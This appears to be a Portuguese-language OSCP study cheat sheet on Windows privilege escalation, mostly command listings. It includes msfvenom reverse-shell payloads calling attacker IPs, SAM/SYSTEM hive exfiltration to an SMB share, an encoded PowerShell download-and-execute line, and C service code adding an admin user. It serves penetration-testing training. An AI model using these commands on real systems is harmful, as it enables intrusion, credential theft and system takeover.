# Privesc Windows - OSCP

- Checklist: [Hacktricks](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- [Shushant 747 Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [PaylaodsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [CheatSheet](https://cheats.philkeeble.com/windows/local-privilege-escalation)


# Estratégia

- Checar o user, grupos e privs:
	- `whoami`
	- `whoami /priv`
		- Se o priv ta listado, o usuário tem. É irrelevante estar disabled
	- `net user <username>`
- Rodar o winPEAS
	- Da pra rodar primeiro com `fast`, `searchfast` e `cmd`
- Rodar Seatbelt e outros scripts, como wes
- Se estiver falhando, rodar os comandos manuais
- Fazer notas!
- Procurar por arquivos no seu Desktop, Documents, Downloads e C:\ e Programs Files
- Ler os arquivos interessantes que encontrar
- Checar portas internas, porque você pode querer exploitar elas através de Portfowarding
- Faça as explorações rápidas primeiro e sempre cheque os processos que o admin roda
- Se estiver dando errado, leia os arquivos e processos estranhos
- Por ultimo, Kernel

___

# Initial Enumeration

- Foothoold na máquina [[Devel]]


## System Enumeration

```
systeminfo
# Para infos do sistema, pra usar com sherlock ou watson

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# Onliner pra facilitar

wmic qfe
# Procurar fixes: 

wmic logicaldisk get caption,description,providername
# Ver os discos
```


## User Enumeration

```
whoami
iis apppool\web

whoami /priv
# Privilégios

whoami /groups

net user

net user <user>
# Para infos de um user

net localgroup administrators
# Listar usuários do grupo admin
```


## Network Enumeration

```
ipconfig /all

arp -a
# Tabela ARP

route print
# Tabela de Roteamento
```


## Password Hunting

- É possível achar mais onliners no Payloads All The Things

```
findstr /si password *.txt
```


## Antivirus e Windows Firewall

```
sc query windefend
# Ver o AV (Defender no caso)

sc queryex type= service
# Listar serviços, aqui pode achar AVs

netsh advfirewall firewall dump
# Comando mais moderno pra ver o firewall do windows

netsh firewall show state
# Comando mais antigo pra ver o firewall

netsh firewall show config
# Configs do firewall
```

___

# Kernel Exploit

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

```
python windows-exploit-suggester.py --update
# Update do wes

nano systeminfo.txt
# Copiar o systeminfo da máquina

python ~/Documentos/tools/Windows/windows-exploit-suggester.py --database ~/Documentos/tools/Windows/2023-02-05-mssb.xls --systeminfo systeminfo.txt 
# Usando windows-exploit-suggester

# É preciso olhar todos os exploits da lista
```


___

# Stored Password

- Olhar nos registradores, porque é mais rápido
- Da pra usar os comandos `dir /s *pass* == .*config` e `findstr /si password *.xml *.ini *.txt`, mas demoram bastante, porque é uma busca recursiva. O winpeas já roda.

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

winexe -U "admin%<pass>" --system //<ip> cmd.exe
# Para ganhar uma sessão depois de pegar o usuário
```


## Dump do SAM

```
# As creds ficam em C:\Windows\System32\config ou C:\Windows\System32\config\RegBack

copy C:\Windows\Repair\SAM \\10.10.10.10\kali\

copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\

git clone https://github.com/Tib3rius/creddump7

pip3 install pycrypto

python3 creddump7/pwdump.py SYSTEM SAM

# Ou samdump2 SYSTEM SAM 

hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

# Da pra usar pth-winexe pra usar o passthehash
pth-winexe -U 'admin%hash' //<ip> cmd.exe --system
```

___

# Scheduled Tasks

- Não tem uma forma fácil de enumerar essas tasks, mas da pra rodar alguns comandos

```
schtasks /query /fo LIST /v

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

accesschk64.exe -quv <script>
# Para veras perms que temos

# Depois é só escrever no script que será executado e esperar a execução
```


___

# WSL

- Para achar o wsl: `where /R c:\windows bash.exe`
- Ou `where /R c:\windows wsl.exe`

```
wsl whoami
./ubuntun1604.exe config --default-user root

wsl whoami

wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'

```

___

# Token Impersonation

- São chaves temporárias que permitem o acesso a máquina sem credencial
- Delegate Tokens -> Logar em máquinas ou RDP
- Impersonate -> Login não interativo, como um logon script
- Olhar sempre o `whoami /priv`, se tiver o `SeImpersonatePriviledge` ou `SeAssignPrimaryToken`, é um caminho para impersonar
- Outros privilégios perigosos: `SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug`
- Olhar o: [Payload All The Things - Priviledges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges) para ver quais privilégios são perigosos
- [Potatos](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

```
impacket-smbserver teste `pwd`

New-PSDrive -Name "name" -PSProvider "FileSystem" -Root "\\10.10.14.10\teste"

# Criando os shares

cd name:

msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.10 LPORT=9494 > shell.bat

nc -nlvp 9494

./JuicyPotato.exe -t * -p shell.bat -l 4444

```

___

# Runass

- As vezes o Windows permit que usuários salvem as credenciais no sistema, assim da pra rodar o runas com essa credencial armazenada
- O Winpeas pega isso em `Currently Stored Credentials`

```
cmdkey /list
#Para coletar as creds armazenadas

runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAAvAHIAZQB2ADIALgBwAHMAMQAnACkA"
# Exemplo de execução
```

- [Bypass applocker list](https://github.com/api0cradle/UltimateAppLockerByPassList)

___

# Registry Escalation

## Autoruns

- Procurar algo que roda automaticamente e se tiver permissão no executável, da pra escalar o priv
- Rodar o `autorun.exe`
- Da pra enumerar o registro para encontrar autoruns `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

```
# Abrir o autorun.exe e ir para "login"

accesschk64.exe -wvu "C:\Program Files\Autorun Program"
# Rodar o accesschk64.exe, com o w sendo write, o v é verbose e o u é ignorar os erros

-accepteula
# Se for a primeira vez que usa o accesschk 

. .\PowerUp.ps1

Invoke-AllChecks
# Também da pra encontrar com o powerup

# Criar uma shell com msfvenom e colocar o nome de program.exe
# Transferir a shell para C:\Program Files\Autorun Program\program.exe

```


## Always Install Elevated

- Permite que a instalação do msi seja feita de forma administrativa
- Os dois registradores tem que estar habilitados para funcionar

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
# Também da pra verificar com PowerUp

reg query HKCU\Software\Policies\Microsoft\Windows\Installer

msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi

. .\PowerUp.ps1

Write-UserAddMSI

msiexec /i UserAdd.msi

msiexec /i AlwaysInstallElevated.msi
# Ou msiexec /quiet /qn /i "UserAdd.msi"

```


___

# Service Escalation

- Para ver serviços, da pra usar o `sc <comando> <serviço>`
- Para iniciar um serviço é com `net start/stop <serviço>`


## Insecure Service Permissions

- Cada serviço tem um ACL, que define as permissões do serviço
- As permissões que procuramos são `SERVICE_STOP, SERVICE_START, SERVICE_CHANGE_CONFIG E SERVICE_ALL_ACCESS`
- Se alterar as configs, mas não puder restartar, não da pra escalar assim

![[Pasted image 20230209172559.png]]

```
# Para validar:
accesschk.exe /accepteula -uwcqv user <serviço>

sc qc <serviço>

sc query <serviço>

sc config <serviço> binpath= "\"C:\PrivEsc\reverse.exe\""
# Criar um payload de revshell e mover para um diretório que seja possível escrever

net start <serviço>
```


## Registry

- Olhar se temos full control em `regsvc` que é o registrador responsável pelos serviços
- É possível identificar com `Get-Acl` que é Access Control List

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

accesschk.exe /accepteula -uwcqv user <serviço>

reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

# Procurar por NT AUTHORITY\INTERACTIVE Allow FullControl

gedit windows_service.c 
# Código abaixo

x86_64-w64-mingw32-gcc windows_service.c -o x.exe
# Copiar para a máquina alvo (User o impacket-smbserver)

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc
# Melhor usar isso no cmd.exe e não no Powershell

net localgroup administrator
# Pra confirmar
```


```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 

```


## Executable Files and Services

- Da pra identificar com PowerUp no `[*] Checking service executable and arguments permissions`. Irá identificar um arquivo 
- Também da pra identificar com `accesschk64.exe -wvu "C:\Program Files\"`
- As vezes terá que rodar `sc queryex type= service` para achar os serviços e depois verificar com o accesschk
- Pode usar o powerup e depois o accesschk pra validar, uma vez que estiver o `Everyone`

```
# Identificar o arquivo
# Copiar o código C acima com o mesmo nome do arquivo, para o diretório encontrado

copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```


## Startup Application

- Não é encontrado pelo powerup, então tem que ver pelo `icacls.exe`
- Da pra identificar com o winpeas
- também com o ``accesschk64.exe -wvuq`

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Procurar se o usuário tem (F): Full Access

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
# Colocar na pasta Startups, igual o Autorun

# Também da pra rodar o vbs abaixo no startup para criar um link para um executável. Executar o vbs com cscript para criar o link
```


```vb
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```


## DLL Hijacking

- [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)


```
ipmo PowerUp.ps1

Invoke-Allchecks
# Também da com o Winpeas, que é melhor

Find-PathDllHijack

Write-HijackDll -DllPath "C:\temp\<nome da dll>"
# Também da pra criar uma dll com msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
# Ou copiar a dll pra dentro da máquina e alterar ela

sc stop dllsvc & sc start dllsvc
```


___

# Paths Escalation

## Binary Path

- Da pra encontrar com o PowerUp com `invoke-allchecks`

```
accesschk64.exe -wuvc <servicename>

Get-ModifiableService
# Com powerup

Invoke-ServiceAbuse -Name <servicename> (will create a local admin john:Password123!)
Invoke-ServiceAbuse -Name <servicename> -Command "net localgroup Administrators user /add"
​
# Manual
​
sc config <servicename> binPath= "cmd.exe /c net localgroup administrators user/add"
sc stop <servicename>
sc start <servicename>
```


## Unquoted Service Path

- Abusando de service paths que tem um path sem aspas e com espaços
- Da pra identificar pelo powerup
- Tem que colocar o arquivo no mesmo lugar que o executável original e depois startar o sistema
- No exemplo: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`, o Windows tentará achar um executável em `Program.exe; Unquoted.exe; Common.exe`, por conta dos espaços ele acha que o que vem a seguir é o argumento de um binário. Tipo rodar `whoami` em vez de `whoami.exe`
- É mais comom esquever depois do program files, por conta das permissões de usuário comum

![[Pasted image 20230209180326.png]]

```
sc qc <serviço>

accesschk.exe /accepteula -uwdq <Path>
# Usar em todos os caminhos do unquoted service Path, para saber onde tem permissão de escrever

# Abuse
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
Write-ServiceBinary -Name 'service' -Path <HijackPatch> (will add john:Password123!)
Write-ServiceBinary -Name 'service' -Path C:\WebServer\Abyss.exe -Command "net localgroup Administrators user /add"

# Restart Service (cmd)
sc stop service
sc start service
net start service

```


___

# Spawning a shell

```
.\PsExec64 -accepteula -i -s C:\Privesc\reverse.exe
# Onde reverse.exe é uma revshell gerada por msfvenom
```


___

# Insecure GUI Apps

- É possível que alguns aplicativos ou atalhos para aplicativos esteja rodando com priv administrativo. Se tiver algo suspeito e tiver acesso RDP, é possível fazer `tasklist /V | findstr <app.exe>`
- Se tiver como admin, usar o file > open, para executar `file://c:/windows/system32/cmd.exe`

___

# Installed Apps

```
seatbelt.exe NonstandardProcesses
# Procurar executáveis que não sao comuns

# winPEAS também encontra esses apps incomuns
# Usar o Exploitdb para procurar por exploits para estes processos
```
